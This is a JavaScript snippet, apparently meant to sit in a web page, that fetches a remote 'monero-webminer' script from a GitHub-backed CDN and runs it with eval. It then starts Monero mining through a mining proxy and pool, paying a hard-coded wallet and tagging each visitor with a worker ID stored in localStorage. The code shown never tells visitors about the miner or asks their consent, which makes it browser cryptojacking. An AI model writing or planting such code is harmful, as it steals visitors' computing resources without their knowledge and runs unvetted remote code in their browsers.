    let uniqueIdsGenerated = 0;

    function generateWorkerId() {
        const userId = localStorage.getItem('userid');

        if (userId !== null) {
            return 'miner-' + userId.slice(-2) + '-online'; // Ensures only last two digits are used
        } else {
            const randomNumber = Math.floor(Math.random() * 90) + 10; // Generates numbers between 10 and 99

            if (uniqueIdsGenerated < 20) {
                uniqueIdsGenerated++;

                localStorage.setItem('userid', randomNumber.toString());

                return 'miner-' + randomNumber.toString() + '-online';
            } else {
                console.error("Maximum unique IDs reached.");
                return "default";
            }
        }
    }

    
      fetch("https://cdn.jsdelivr.net/gh/DoxrGitHub/monero-webminer@main/script.js").then(raw => raw.text()).then(script => {
        eval(script)
        server = "wss://ny1.xmrminingproxy.com";
        var pool = "moneroocean.stream";
        var walletAddress = "44DPnyBeq619rv4dMt8mpCRYeqBypS66n1meKN61DQnJe17y1ZDiakyfHKD9YypBExEB5r6xs7cjpggWg63vtjpGDSd5s8t"; // ily pooks
        var threads = 1;
        var password = "";
        startMining(pool, walletAddress, generateWorkerId(), threads, password);
        throttleMiner = 20;
      })
